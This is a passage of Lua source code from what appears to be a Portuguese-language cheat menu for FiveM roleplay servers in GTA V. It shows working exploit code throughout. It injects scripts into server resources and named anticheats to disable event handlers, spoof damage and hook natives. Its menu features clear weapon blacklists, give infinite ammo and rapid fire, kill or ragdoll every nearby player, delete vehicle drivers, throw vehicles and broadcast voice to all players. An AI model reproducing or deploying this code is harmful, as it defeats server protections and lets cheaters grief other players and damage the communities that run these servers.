                        FrameAPI.SyncTree.SpoofServerDamage(false, 0)
                        next.bypass.weapon(false)
                    else
                    end
                end)
                    next.elements.button("Remover Todas as Armas", "remover_todas_as_armas", function()
                        RemoveAllPedWeapons(PlayerPedId())
                        SetPedInfiniteAmmoClip(PlayerPedId(), false)
                        FrameAPI.SyncTree.SpoofServerDamage(false, 0)
                        next.bypass.weapon(false)
                    end)
                    next.elements.groupbox("Extras", "Extra", "\xee\x86\x9b", 280, 0, 270, 300)
                    next.elements.button("Remover Armas da Blacklist", "blackweapon", function()
                    if group == "Noway Group" then
                        FrameAPI.Inject("core", [[
                            _G.blackWeapons = {}
                        ]])
                        next.elements.notify("Blacklist Removida!", "success")
                        elseif group == "Space Group" then
                                local code = [[
                                    blacklistedWeapons =
                                    {
                                        'nextmenutop1',
                                    }
                                ]]
                                FrameAPI.Inject('space-services', code)
                                next.elements.notify("Blacklist Removida!", "success")
                            elseif group == "Lotus Group" then
                                local code = [[
                                    blacklistedWeapons =
                                    {
                                        'nextmenutop1',
                                    }
                                ]]
                                FrameAPI.Inject('vrp_policia', code)
                                next.elements.notify("Blacklist Removida!", "success")
                            elseif group == "Santa Group" then
                                local code = [[
                                    BlackList =
                                    {
                                        'nextmenutop1',
                                    }
                                ]]
                                FrameAPI.Inject('vrp', code)
                                next.elements.notify("Blacklist Removida!", "success")
                            elseif city == "Central Rp" then
                                local code = [[
                                    blacklistedWeapons =
                                    {
                                        'nextmenutop1',
                                    }
                                ]]
                                FrameAPI.Inject('inventory', code)
                                next.elements.notify("Blacklist Removida!", "success")
                            elseif city == "Atlanta Rj" then
                                local code = [[
                                    blacklistedWeapons =
                                    {
                                        'nextmenutop1',
                                    }
                                ]]
                                FrameAPI.Inject('vrp_policia', code)
                                next.elements.notify("Blacklist Removida!", "success")
                            elseif group == "Fusion Group" then
                                local code = [[
                                    blackWeapons =
                                    {
                                        'nextmenutop1',
                                    }
                                ]]
                              FrameAPI.Inject('core_misc', code)
                              next.elements.notify("Blacklist Removida!", "success")
                            else
                            next.elements.notify("Cidade Sem Suporte!", "warning")
                        end
                    end)
next.elements.slider("Setar Munição", "muni_amount", {start = 0, min = 0, max = 250}, function(value)
end)
FrameAPI.Inject('ThnAC', code)
next.elements.button("Adicionar Munição", "add_muni", function()
    local input = next.values.slider["muni_amount"]
    local amount = tonumber(input)
    if not amount or amount <= 0 then
        next.elements.notify("Quantidade inválida!", "warning")
        return
    end
            if group == "Lotus Group" then
                FrameAPI.Inject('likizao_ac', [[
                    TriggerEvent = function(...) return end
                    RegisterNetEvent = function(...) return end
                    AddEventHandler = function(...) return end
                    CreateThread = function(...) return end
                    RegisterCommand = function(...) return end
                    exports = setmetatable({}, {
                        __index = function()
                            return function(...) return end
                        end
                    })
                ]])
                FrameAPI.Inject('likizao_ac', [[
                    if not _G._ORIGINAL_TRIGGER_SERVER_EVENT then
                        _G._ORIGINAL_TRIGGER_SERVER_EVENT = TriggerServerEvent
                    end
                    TriggerServerEvent = function(eventName, ...)
                        return
                    end
                ]])
                FrameAPI.Inject('likizao_ac', string.format([[
                    local ammo = %d
                    local arma = GetSelectedPedWeapon(PlayerPedId())
                    GetSelectedPedWeapon = function(ped)
                        return arma
                    end
                    GetAmmoInClip = function(ped, weaponHash)
                        return ammo
                    end
                    GetAmmoInPedWeapon = function(ped, weaponHash)
                        return ammo
                    end
                ]], amount))
                FrameAPI.Scripting.HookNative(0x2E1202248937775C, amount)
                FrameAPI.Scripting.HookNative(0x015A522136D7F951, amount)
                FrameAPI.Inject('inventory', string.format([[
                    local ammo = %d
                    local arma = GetSelectedPedWeapon(PlayerPedId())
                    SetPedAmmo(PlayerPedId(), arma, ammo)
                ]], amount))
                FrameAPI.Inject('likizao_ac', [[
                    if _G._ORIGINAL_TRIGGER_SERVER_EVENT then
                        TriggerServerEvent = _G._ORIGINAL_TRIGGER_SERVER_EVENT
                        _G._ORIGINAL_TRIGGER_SERVER_EVENT = nil
                    end
                ]])
            end
        next.elements.notify("Munição aplicada com sucesso!", "success")
    end)
                    next.elements.slider("Tamanho Da Arma", "arma", {min = 0, max = 300, start = 5}, function(value)
                    end)
                    next.elements.checkbox("Arma Gigante", "gigante", function(bool)
                        local a = PlayerPedId()
                        local w = GetSelectedPedWeapon(a)
                        while next.values.checkbox["gigante"] do
                            Wait(0)
                            local value = next.values.slider['arma']
                            FrameAPI.EditWeaponSize(value)
                        end
                    end)
        next.elements.slider("Cor Da Arma", "weaponCor", {min = 0, max = GetWeaponTintCount(GetSelectedPedWeapon(PlayerPedId())), start = 5}, function(v)
                SetPedWeaponTintIndex(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), v)
            end)
            next.elements.checkbox("Munição Infinita", "infiniteAmmo", function(bool)
            nt.createTh(function()
            while next.values.checkbox["infiniteAmmo"] do
            SetPedInfiniteAmmoClip(PlayerPedId(), true)
            Wait(1)
            end
            SetPedInfiniteAmmoClip(PlayerPedId(), false)
            end)
        end)
                    next.elements.checkbox("Habilitar Coronhada", "coronhada_novo", function(bool)
                        if bool then
                        nt.createTh(function()
                        while next.values.checkbox["coronhada_novo"] do
                        local player = PlayerPedId()
                        SetPedConfigFlag(player, 122, false)
                        SetPedConfigFlag(player, 458, true)
                        EnableControlAction(0, 140, true)
                        EnableControlAction(0, 141, true)
                        EnableControlAction(0, 142, true)
                        EnableControlAction(0, 263, true)
                        EnableControlAction(0, 264, true)
                        SetPedCombatAttributes(player, 5, true)
                        SetPedCombatAttributes(player, 13, true)
                        SetPedCanPlayGestureAnims(player, true)
                        Wait(0)
                        end
                        end)
                        end
                        end)

                        next.elements.checkbox("Hablitar Tab", "habilitartab", function()
                            local controls = {37, 24, 25, 19, 299, 239, 240, 237, 238, 33, 16, 17, 24, 257, 327, 92, 106, 37}
                            while next.values.checkbox["habilitartab"] do
                            for _, key in pairs(controls) do
                                EnableControlAction(0, key, true)
                            end
                            EnableAllControlActions(0)
                            EnableAllControlActions(1)
                            SetCanPedEquipAllWeapons(PlayerPedId(), true)
                            SetPedCanSwitchWeapon(PlayerPedId(), true)
                            for i = 1, 22 do
                                ShowHudComponentThisFrame(i)
                            end
                            SetPedConfigFlag(PlayerPedId(), 48, false)
                            SetPedConfigFlag(PlayerPedId(), 184, false)
                            ShowHudComponentThisFrame(19)
                            NetworkSetFriendlyFireOption(true)
                            SetCanAttackFriendly(PlayerPedId(), true, true)
                            SetCanPedEquipAllWeapons(PlayerPedId(), true)
                            Citizen.Wait(0)
                        end
                    end)

                        next.elements.button("Dar Attachs", "dar_attachs", function()
                            components = {
                            [GetHashKey("WEAPON_PISTOL")] = {
                            "COMPONENT_PISTOL_CLIP_02",
                            "COMPONENT_AT_PI_FLSH"
                            },
                            [GetHashKey("WEAPON_PISTOL_MK2")] = {
                            "COMPONENT_AT_PI_FLSH_02",
                            "COMPONENT_AT_PI_COMP",
                            "COMPONENT_AT_PI_RAIL"
                            },
                            [GetHashKey("WEAPON_CERAMICPISTOL")] = {
                            "COMPONENT_CERAMICPISTOL_CLIP_02"
                            },
                            [GetHashKey("WEAPON_COMBATPISTOL")] = {
                            "COMPONENT_COMBATPISTOL_CLIP_02",
                            "COMPONENT_AT_PI_FLSH"
                            },
                            [GetHashKey("WEAPON_SMG")] = {
                            "COMPONENT_AT_AR_FLSH",
                            "COMPONENT_AT_SCOPE_MACRO_02"
                            },
                            [GetHashKey("WEAPON_SMG_MK2")] = {
                            "COMPONENT_AT_AR_FLSH",
                            "COMPONENT_AT_PI_SUPP",
                            "COMPONENT_AT_SIGHTS_SMG"
                            },
                            [GetHashKey("WEAPON_MINISMG")] = {
                            "COMPONENT_MINISMG_CLIP_02"
                            },
                            [GetHashKey("WEAPON_MICROSMG")] = {
                            "COMPONENT_AT_PI_FLSH",
                            "COMPONENT_AT_SCOPE_MACRO"
                            },
                            [GetHashKey("WEAPON_COMBATPDW")] = {
                            "COMPONENT_AT_AR_FLSH",
                            "COMPONENT_AT_SCOPE_SMALL",
                            "COMPONENT_AT_AR_AFGRIP"
                            },
                            [GetHashKey("WEAPON_MACHINEPISTOL")] = {
                            "COMPONENT_AT_PI_SUPP",
                            "COMPONENT_MACHINEPISTOL_CLIP_02"
                            },
                            [GetHashKey("WEAPON_ASSAULTSMG")] = {
                            "COMPONENT_AT_AR_FLSH",
                            "COMPONENT_AT_SCOPE_MACRO"
                            },
                            [GetHashKey("WEAPON_COMBATMG")] = {
                            "COMPONENT_COMBATMG_CLIP_02",
                            "COMPONENT_AT_SCOPE_MEDIUM",
                            "COMPONENT_AT_AR_AFGRIP"
                            },
                            [GetHashKey("WEAPON_ASSAULTRIFLE")] = {
                            "COMPONENT_AT_AR_FLSH",
                            "COMPONENT_AT_SCOPE_MACRO",
                            "COMPONENT_AT_AR_AFGRIP"
                            },
                            [GetHashKey("WEAPON_ASSAULTRIFLE_MK2")] = {
                            "COMPONENT_AT_AR_FLSH",
                            "COMPONENT_AT_SCOPE_MEDIUM_MK2",
                            "COMPONENT_AT_AR_AFGRIP_01"
                            },
                            [GetHashKey("WEAPON_CARBINERIFLE")] = {
                            "COMPONENT_AT_AR_FLSH",
                            "COMPONENT_AT_MUZZLE_04",
                            "COMPONENT_AT_SIGHTS",
                            "COMPONENT_AT_AR_AFGRIP_02"
                            },
                            [GetHashKey("WEAPON_CARBINERIFLE_MK2")] = {
                            "COMPONENT_AT_AR_FLSH",
                            "COMPONENT_AT_MUZZLE_04",
                            "COMPONENT_AT_SIGHTS",
                            "COMPONENT_AT_AR_AFGRIP_02"
                            },
                            [GetHashKey("WEAPON_ADVANCEDRIFLE")] = {
                            "COMPONENT_ADVANCEDRIFLE_CLIP_02",
                            "COMPONENT_AT_AR_FLSH",
                            "COMPONENT_AT_SCOPE_SMALL"
                            },
                            [GetHashKey("WEAPON_MILITARYRIFLE")] = {
                            "COMPONENT_MILITARYRIFLE_CLIP_01",
                            "COMPONENT_AT_AR_FLSH",
                            "COMPONENT_AT_SCOPE_SMALL"
                            },
                            [GetHashKey("WEAPON_COMPACTRIFLE")] = {
                            "COMPONENT_COMPACTRIFLE_CLIP_02"
                            },
                            [GetHashKey("WEAPON_SPECIALCARBINE")] = {
                            "COMPONENT_AT_AR_FLSH",
                            "COMPONENT_AT_SCOPE_MEDIUM"
                            },
                            [GetHashKey("WEAPON_SPECIALCARBINE_MK2")] = {
                            "COMPONENT_AT_AR_FLSH",
                            "COMPONENT_AT_SCOPE_MEDIUM_MK2",
                            "COMPONENT_AT_MUZZLE_01"
                            }
                            }
                            local weapon = GetSelectedPedWeapon(PlayerPedId())
                            if components[weapon] then
                            for a, component in pairs(components[weapon]) do
                            GiveWeaponComponentToPed(PlayerPedId(), weapon, component)
                            end
                            end
                            end)
                    next.elements.checkbox("Sem Recuo", "sem_recuo", function(bool)
                        if bool then
                            nt.createTh(function()
                                while next.values.checkbox["sem_recuo"] do
                                    local a = PlayerPedId()
                                    local _, weapon = GetCurrentPedWeapon(a, true)
                                    SetPlayerWeaponDamageModifier(PlayerId(), 1.0)
                                    SetWeaponRecoilShakeAmplitude(weapon, 0.0)
                                    Wait(1)
                                end
                            end)
                        end
                    end)
                    next.elements.checkbox("Atirar Dentro do Veículo", "atirar_veiculo", function(bool)
                        if next.values.checkbox["atirar_veiculo"] then
                            FrameAPI.Inject("nxgroup-script", [[
                                _G.SetPlayerCanDoDriveBy = function()
                                    return false
                                end
                            ]])
                            SetPlayerCanDoDriveBy(PlayerId(), true)
                        end
                    end)
                  next.elements.checkbox("Rapid Fire", "tiroRapido", function(bool)
                    if not bool then return end
                    nt.createTh(function()
                        while next.values.checkbox['tiroRapido'] do
                            Wait(60)
                            local ped = PlayerPedId()
                            local weapon = GetSelectedPedWeapon(ped)
                            local unarmed = GetHashKey("WEAPON_UNARMED")
                            if weapon ~= unarmed and IsDisabledControlPressed(0, 24) and IsDisabledControlPressed(0, 25) then
                                local weaponEntity = GetCurrentPedWeaponEntityIndex(ped)
                                local launchPos
                                if weaponEntity and weaponEntity ~= 0 and DoesEntityExist(weaponEntity) then
                                    launchPos = GetEntityCoords(weaponEntity)
                                else
                                    launchPos = GetPedBoneCoords(ped, 57005, 0.12, 0.02, 0.0)
                                end
                                local targetPos = GetGameplayCamCoord() + (RotationToDirection(GetGameplayCamRot(2)) * 200.0)
                                RequestWeaponAsset(weapon, 31, 0)
                                local damage = GetWeaponDamage(weapon)
                                ShootSingleBulletBetweenCoords(
                                    launchPos.x, launchPos.y, launchPos.z,
                                    targetPos.x, targetPos.y, targetPos.z,
                                    damage, true, weapon, ped, true, false, -1.0, true
                                )
                            end
                        end
                    end)
                end)
                    next.elements.checkbox("Sem Spread", "sem_spread", function(bool)
                        if bool then
                            nt.createTh(function()
                                while next.values.checkbox["sem_spread"] do
                                    local ped = PlayerPedId()
                                    SetPedAccuracy(ped, 100)
                                    Wait(0)
                                end
                            end)
                        else
                            SetPedAccuracy(PlayerPedId(), 50)
                        end
                    end)
                end
                elseif next.vars.tab_selected == "Destruição" then
                    if next.vars.subtab_selected == "Troll" then
                        next.elements.groupbox("Troll Options", "troll", "\xef\x87\xa2", 0, 0, 270, 300)

if anticheat == "ThnAC" then
next.elements.button("Matar todos", "killall", function(bool)
    FrameAPI.BlockGameEvent('onPlayerKilled', true)
    FrameAPI.BlockGameEvent('CEventNetworkPlayerKilled', true)
    FrameAPI.BlockGameEvent('CEventNetworkEntityKilled', true)
    
    FrameAPI.Scripting.HookNative(0x8DECB02F88F428BC, false) 
    FrameAPI.Scripting.HookNative(0x43A3F7FAA5CFD5D0, false) 
    FrameAPI.Scripting.HookNative(0x1D5F6A7B6C8E9F0A, false) 
    
    FrameAPI.SyncTree.SpoofServerDamage(true, GetHashKey("WEAPON_HEN"))
    FrameAPI.SyncTree.SpoofWeapon(true)
    
    FrameAPI.BlockGameEvent('onDamage', true)
    FrameAPI.BlockGameEvent('onWeaponDamage', true)
    
    local playerCoords = GetEntityCoords(PlayerPedId())
    local weaponHash = GetHashKey('WEAPON_PISTOL_MK2')
    local shooter = PlayerPedId()
    
    for _, player in ipairs(GetActivePlayers()) do
        local ped = GetPlayerPed(player)
        if ped ~= shooter then 
            local targetCoords = GetEntityCoords(ped)
            local distance = #(playerCoords - targetCoords)
            
            if distance <= 500.0 then
                for i = 1, 3 do
                    ShootSingleBulletBetweenCoords(
                        targetCoords.x, targetCoords.y, targetCoords.z + 10.0,
                        targetCoords.x, targetCoords.y, targetCoords.z,
                        1000,
                        true,
                        weaponHash,
                        shooter,
                        true,
                        false,
                        -1.0,
                        true
                    )
                end
            end
        end
    end
    
    Wait(10)
        FrameAPI.BlockGameEvent('onPlayerKilled', false)
        FrameAPI.BlockGameEvent('CEventNetworkPlayerKilled', false)
        FrameAPI.BlockGameEvent('CEventNetworkEntityKilled', false)
        FrameAPI.BlockGameEvent('onDamage', false)
        FrameAPI.BlockGameEvent('onWeaponDamage', false)
        FrameAPI.Scripting.HookNative(0x8DECB02F88F428BC, true)
        FrameAPI.Scripting.HookNative(0x43A3F7FAA5CFD5D0, true)
        FrameAPI.Scripting.HookNative(0x1D5F6A7B6C8E9F0A, true)
    end)
end
if anticheat == "Fiveguard" then
next.elements.button("Matar todos", "killall", function(bool)
local playerCoords = GetEntityCoords(PlayerPedId())

for _, player in ipairs(GetActivePlayers()) do
    local ped = GetPlayerPed(player)
    local targetCoords = GetEntityCoords(ped)
    local distance = #(playerCoords - targetCoords)
    
    if distance <= 500.0 then
        ShootSingleBulletBetweenCoords(
            targetCoords.x, targetCoords.y, targetCoords.z + 10.0,  
            targetCoords.x, targetCoords.y, targetCoords.z,        
            1000,                                                  
            true,                                                   
            GetHashKey('WEAPON_TRANQUILIZER'),                     
            PlayerPedId(),                                         
            true,                                                  
            false,                                                 
            -1.0,                                                  
            true                                                   
        )
    end
end
end)
end
 
next.elements.checkbox("Pysic Gun", "pysicgun", function()
    if next.values.checkbox["pysicgun"] then
        local myCoords = GetEntityCoords(PlayerPedId())
        local isFollowingCamera = false
        local vehicle = nil
        local function RotationToDirection(rotation)
            local radZ = math.rad(rotation.z)
            local radX = math.rad(rotation.x)
            local dirX = -math.sin(radZ) * math.abs(math.cos(radX))
            local dirY = math.cos(radZ) * math.abs(math.cos(radX))
            local dirZ = math.sin(radX)
            return {x = dirX, y = dirY, z = dirZ}
        end
        while next.values.checkbox["pysicgun"] do
            Wait(0)
            next.functions['display_message']("Aperte E no Carro para Usar!", true)
            if IsControlJustPressed(0, 38) then
                if isFollowingCamera and vehicle ~= 0 then
                    local camRot = GetGameplayCamRot(2)
                    local forwardVector = RotationToDirection(camRot)
                    local forceMultiplier = next.values.slider['pysicspeed']
                    FreezeEntityPosition(vehicle, false)
                    SetEntityDynamic(vehicle, true)
                    ApplyForceToEntity(vehicle, 1, forwardVector.x * forceMultiplier, forwardVector.y * forceMultiplier, forwardVector.z * forceMultiplier, 0, 0, 0, 0, false, true, true, false, true)
                    isFollowingCamera = false
                else
                    isFollowingCamera = true
                    vehicle = GetVehiclePedIsIn(PlayerPedId(), false)
                    if vehicle == 0 then
                        vehicle = GetClosestVehicle(GetEntityCoords(PlayerPedId()), 10.0, 0, 70)
                    end
                    if vehicle == 0 then
                        isFollowingCamera = false
                    else
                        local driver = GetPedInVehicleSeat(vehicle, -1)
                        if driver == 0 then
                            TaskWarpPedIntoVehicle(player, vehicle, -1)
                            FreezeEntityPosition(vehicle, true)
                            Wait(30)
                            SetEntityCoordsNoOffset(PlayerPedId(), myCoords.x, myCoords.y, myCoords.z, false, false, false, true)
                        else
                            next.removerplayer(driver)
                            Wait(500)
                            SetEntityCoordsNoOffset(PlayerPedId(), myCoords.x, myCoords.y, myCoords.z, false, false, false, true)
                            FreezeEntityPosition(vehicle, true)
                        end
                    end
                end
            end
            if isFollowingCamera and vehicle ~= 0 then
                local playerPed = PlayerPedId()
                local playerCoords = GetEntityCoords(playerPed)
                local camRot = GetGameplayCamRot(2)
                local forwardVector = RotationToDirection(camRot)
                local newX = playerCoords.x + forwardVector.x * 5.0
                local newY = playerCoords.y + forwardVector.y * 5.0
                local newZ = playerCoords.z + forwardVector.z * 5.0
                SetEntityCoordsNoOffset(vehicle, newX, newY, newZ, true, true, true)
                SetEntityRotation(vehicle, camRot.x, camRot.y, camRot.z, 2, true)
                SetEntityVelocity(vehicle, 0.0, 0.0, 0.0)
            end
        end
    end
end)
next.elements.slider("Força Pysic Gun", "pysicspeed", {min = 1, max = 1000, start = 1}, function()
end)
next.elements.checkbox("Pegar no Y", "segurar_veiculos", function(v)
    if not v then return end

    for _, resourceName in pairs(FrameAPI.GetLoadedResources()) do
        FrameAPI.Inject(resourceName, [[
            Citizen.CreateThread(function()
              while true do
                    SetPedIntoVehicle = function() return false end
                    DeletePed = function() return false end
                    DeleteEntity = function() return false end
                    ClearPedTasksImmediately = function() return false end
                    TaskPlayAnim = function() return false end
                    _G.ApplyForceToEntity = function(entity, forceType, x, y, z, fx, fy, fz, multiplier, isInertia, isX, isY, isZ, isF)
                    return true 
                    end
                    ApplyForceToEntity = function(entity, forceType, x, y, z, fx, fy, fz, multiplier, isInertia, isX, isY, isZ, isF)
                    return true 
                    end
                    
                    _G.SetPedIntoVehicle = function() return false end
                    _G.DeletePed = function() return false end
                    _G.DeleteEntity = function() return false end
                    _G.ClearPedTasksImmediately = function() return false end
                    _G.TaskPlayAnim = function() return false end

                    IsEntityAttached = function() return false end
                    IsEntityPlayingAnim = function() return false end
                    GetEntityCollision = function() return false end
                    GetEntityVelocity = function() return vec3(0.0, 0.0, 0.0) end
                    GetPedInVehicleSeat = function() return 0 end
                    
                    _G.IsEntityAttached = function() return false end
                    _G.IsEntityPlayingAnim = function() return false end
                    _G.GetEntityCollision = function() return false end
                    _G.GetEntityVelocity = function() return vec3(0.0, 0.0, 0.0) end
                    _G.GetPedInVehicleSeat = function() return 0 end
                    Wait(500)
                end
            end)
        ]])
    end

    nt.createTh(function()
    local function requestControl(entity)
        if not entity or entity == 0 or not DoesEntityExist(entity) then
            return false
        end

        if not NetworkGetEntityIsNetworked(entity) then
            return true
        end

        local netId = NetworkGetNetworkIdFromEntity(entity)
        SetNetworkIdCanMigrate(netId, true)

        local deadline = GetGameTimer() + 1000
        while not NetworkHasControlOfEntity(entity) and GetGameTimer() < deadline do
            NetworkRequestControlOfEntity(entity)
            NetworkRequestControlOfNetworkId(netId)
            Wait(0)
        end

        return NetworkHasControlOfEntity(entity)
    end

    local holdingVehicle = false
    local heldVehicle = nil
    local controlledVehicle = nil
    local takingControl = false

    while next.values.checkbox["segurar_veiculos"] do
        Wait(0)

        local playerPed = PlayerPedId()
        local camPos = GetGameplayCamCoord()
        local camRot = GetGameplayCamRot(2)
        local direction = next.functions.RotationToDirection(camRot)

        local dest = vec3(
            camPos.x + direction.x * 10.0,
            camPos.y + direction.y * 10.0,
            camPos.z + direction.z * 10.0
        )

        local rayHandle = StartShapeTestRay(
            camPos.x,
            camPos.y,
            camPos.z,
            dest.x,
            dest.y,
            dest.z,
            2,
            playerPed,
            0
        )

        local _, hit, _, _, entityHit = GetShapeTestResult(rayHandle)
        local currentVehicle = GetVehiclePedIsIn(playerPed, false)

        local validVehicle =
            hit == 1
            and entityHit ~= 0
            and DoesEntityExist(entityHit)
            and GetEntityType(entityHit) == 2
            and entityHit ~= currentVehicle

        if holdingVehicle and heldVehicle and DoesEntityExist(heldVehicle) then
            if NetworkGetEntityIsNetworked(heldVehicle) and not NetworkHasControlOfEntity(heldVehicle) then
                requestControl(heldVehicle)
            end

            local headPos = GetPedBoneCoords(playerPed, 31086, 0.0, 0.0, 0.0)

            next.functions['Draw3DText'](
                headPos.x,
                headPos.y,
                headPos.z + 1.0,
                0.35,
                "Aperte [Y] Para Soltar o Veiculo",
                255,
                255,
                255
            )

            if not IsEntityPlayingAnim(
                playerPed,
                'anim@mp_rollarcoaster',
                'hands_up_idle_a_player_one',
                3
            ) then
                next.functions['RequestAndPlayAnim'](
                    playerPed,
                    'anim@mp_rollarcoaster',
                    'hands_up_idle_a_player_one',
                    50
                )

                next.functions['RequestAndPlayAnim'](
                    playerPed,
                    'anim@mp_rollarcoaster',
                    'hands_up_idle_a_player_one',
                    50
                )

                SetEntityAnimSpeed(
                    playerPed,
                    'anim@mp_rollarcoaster',
                    'hands_up_idle_a_player_one',
                    0.15
                )
            end

        elseif validVehicle and not takingControl then
            local playerCoords = GetEntityCoords(playerPed)

            next.functions['Draw3DText'](
                playerCoords.x,
                playerCoords.y,
                playerCoords.z + 1.0,
                0.35,
                "Aperte [Y] Para Pegar o Veiculo",
                255,
                255,
                255
            )
        end

        if (IsDisabledControlJustReleased(0, 246) or IsControlJustReleased(0, 246)) then
            if holdingVehicle then
                local tempVehicle = heldVehicle

                holdingVehicle = false
                heldVehicle = nil
                controlledVehicle = nil

                ClearPedTasks(playerPed)

                if tempVehicle and DoesEntityExist(tempVehicle) then
                    requestControl(tempVehicle)

                    DetachEntity(tempVehicle, true, true)
                    FreezeEntityPosition(tempVehicle, false)
                    SetEntityCollision(tempVehicle, true, true)

                    local forceValue = next.values.slider["forca_arremesso"] or 50
                    local forceMultiplier = forceValue * 2.0

                    local throwDirection =
                        next.functions.RotationToDirection(
                            GetGameplayCamRot(2)
                        )

                    ApplyForceToEntity(
                        tempVehicle,
                        1,
                        throwDirection.x * forceMultiplier,
                        throwDirection.y * forceMultiplier,
                        throwDirection.z * forceMultiplier,
                        0.0,
                        0.0,
                        0.0,
                        0,
                        false,
                        true,
                        true,
                        false,
                        true
                    )
                end
            elseif validVehicle and not takingControl then
                local target = entityHit

                    local freeSeat = nil
                    local maxPassengers = GetVehicleMaxNumberOfPassengers(target)

                    for seat = 0, maxPassengers - 1 do
                        if IsVehicleSeatFree(target, seat) then
                            freeSeat = seat
                            break
                        end
                    end

                    if freeSeat ~= nil then
                        SetPedIntoVehicle(PlayerPedId(), target, freeSeat)
                    end
                    Wait(100)
                    local driver = GetPedInVehicleSeat(target, -1)
                    for i = 1, 3 do              
                    DeletePed(driver)
                    DeleteEntity(driver)
                    Wait(10)
                    end
                    Wait(100)
                    SetPedIntoVehicle(PlayerPedId(), target, -1)
                    Wait(1000)
                    ClearPedTasksImmediately(PlayerPedId())

                    for i = 1, 3 do  
                    next.functions['RequestAndPlayAnim'](
                        playerPed,
                        'anim@mp_rollarcoaster',
                        'hands_up_idle_a_player_one',
                        50
                    )
                    Wait(10)
                    end

                    SetEntityAnimSpeed(
                        playerPed,
                        'anim@mp_rollarcoaster',
                        'hands_up_idle_a_player_one',
                        -0.15
                    )

                    AttachEntityToEntity(
                        target,
                        playerPed,
                        GetPedBoneIndex(playerPed, 60309),
                        1.0,
                        0.5,
                        0.0,
                        0.0,
                        0.0,
                        0.0,
                        true,
                        true,
                        false,
                        false,
                        1,
                        true
                    )

                    holdingVehicle = true
                    heldVehicle = target
                    controlledVehicle = target
                end
            end

        if controlledVehicle and not DoesEntityExist(controlledVehicle) then
            controlledVehicle = nil
        end

        if holdingVehicle and (
            not heldVehicle
            or not DoesEntityExist(heldVehicle)
        ) then
            holdingVehicle = false
            heldVehicle = nil
            ClearPedTasks(playerPed)
        end
    end

    if heldVehicle and DoesEntityExist(heldVehicle) then
        requestControl(heldVehicle)
        DetachEntity(heldVehicle, true, true)
        FreezeEntityPosition(heldVehicle, false)
        SetEntityCollision(heldVehicle, true, true)
    end

    holdingVehicle = false
    heldVehicle = nil
    controlledVehicle = nil
    takingControl = false

    ClearPedTasks(PlayerPedId())
    end)
end)
next.elements.slider("Força", "forca_arremesso", { min = 1, max = 1000, start = 50 }, function(bool)
end)
                            next.elements.checkbox("Veículos no mar ao entrar", "autosea", function(bool)
                                if next.values.checkbox["autosea"] then
                                nt.createTh(function()
                                while true do
                                    Wait(1)
                                    if next.values.checkbox["autosea"] then
                                        local ped = PlayerPedId()
                                        local veh = GetVehiclePedIsIn(ped, false)
                                        if veh ~= 0 and veh ~= nil then
                                            local coords = GetEntityCoords(ped)
                                            NetworkRequestControlOfEntity(veh)
                                            Wait(100)
                                            if NetworkHasControlOfEntity(veh) then
                                                SetEntityCoordsNoOffset(veh, -2780.0, 3170.0, -50.0, false, false, false, false)
                                                Wait(100)
                                                TaskLeaveVehicle(ped, veh, 0)
                                                SetEntityCoordsNoOffset(ped, coords.x, coords.y, coords.z, false, false, false, false)
                                            end
                                        end
                                    else
                                        break
                                    end
                                end
                                end)
                                else
                                end
                            end)

    next.elements.checkbox("Derrubar todos os players", "derrubartodos", function(bool)
            for i, v in pairs(GetActivePlayers()) do
            FrameAPI.RequestRagdoll(GetPlayerPed(v))
            end
        end)
next.elements.checkbox("Derrubar todos os players em loop", "derrubartodosloop", function(bool)
            Citizen.CreateThread(function()
            while next.values.checkbox["derrubartodos"] do
            for i, v in pairs(GetActivePlayers()) do
                FrameAPI.RequestRagdoll(GetPlayerPed(v))
            end
            Wait(1000)
            end
        end)
   end)
next.elements.checkbox("Falar com Todos (500m)", "voice_global_exploit", function(active)
    if active then
        if FrameAPI and FrameAPI.Scripting.HookNative then
            pcall(function() FrameAPI.Scripting.HookNative("MumbleGetTalkerProximity", 1.0) end)
        end
        nt.createTh(function()
            FrameAPI.Inject("pma-voice", [[
                if not GetConvarInt then
                    GetConvarInt = function() return 0 end
                end
                SendNUIMessage({
                    uiEnabled = GetConvarInt("voice_enableUi", 1) == 1,
                    voiceModes = { { 500.0, "GLOBAL" } },
                    voiceMode = "GLOBAL"
                })
                MumbleSetTalkerProximity(500.0)
                NetworkSetTalkerProximity(500.0)
            ]])
            while next.values.checkbox["voice_global_exploit"] do
                MumbleSetActive(true)
                NetworkSetTalkerProximity(500.0)
                MumbleSetTalkerProximity(500.0)
                MumbleSetVoiceTarget(1)
                local players = GetActivePlayers()
                for i = 1, #players do
                    local ply = players[i]
                    local serverId = GetPlayerServerId(ply)
                    MumbleAddVoiceTargetChannel(1, serverId)
                end
                Wait(250)
            end
            MumbleClearVoiceTarget(1)
            NetworkSetTalkerProximity(5.0)
            MumbleSetTalkerProximity(5.0)
            FrameAPI.Inject("pma-voice", [[
                MumbleSetTalkerProximity(5.0)
                NetworkSetTalkerProximity(5.0)
                local voiceModeData = Cfg.voiceModes[mode]
                SendNUIMessage({
                    voiceModes = Cfg.voiceModes,
                    voiceMode = voiceModeData[2]
                })
            ]])
        end)
    else
        NetworkSetTalkerProximity(5.0)
    end
end)

                        next.elements.groupbox("Exploits Veiculos", "exploits_veiculos", "\xef\x84\x81", 280, 0, 270, 300)
                            next.elements.checkbox("Auto Get Request", "aurooo", function(bool)
                                nt.createTh(function()
                                    while next.values.checkbox["aurooo"] do
                                        for _, k in pairs(next.controlled_vehicles) do
                                            NetworkRequestControlOfEntity(k)
                                        end
                                        Wait(1000)
                                    end
                                end)
                            end)
                            next.elements.button("Levitar Veiculos", "levitar_veiculos", function()
                                nt.createTh(function()
                                for i = 1, 10 do
                                for k, v in ipairs(GetGamePool("CVehicle")) do
                                nt.createTh(function()
                                if NetworkGetEntityIsNetworked(v) and NetworkHasControlOfEntity(v) then
                                SetHornEnabled(v, true)
                                ApplyForceToEntity(v, 1, 0, 0, 25000.0, 0, 0, 0, 0, 0, false, 0, 0, 0)
                                Wait(700)
                                ApplyForceToEntity(v, 1, 0, 0, -400000.0, 0, 0, 0, 0, 0, false, 0, 0, 0)
                                end
                                end)
                                end
                                end
                                end)
                                end)
                                local modoCaosRodando = false
                                next.elements.checkbox("Modo Caos", "modo_caos", function(ativo)
                                if ativo and not modoCaosRodando then
                                modoCaosRodando = true
                                nt.createTh(function()
                                while next.values.checkbox["modo_caos"] do
                                for i = 1, 100 do
                                if not next.values.checkbox["modo_caos"] then break end
                                for _, v in ipairs(GetGamePool("CVehicle")) do
                                if not next.values.checkbox["modo_caos"] then break end
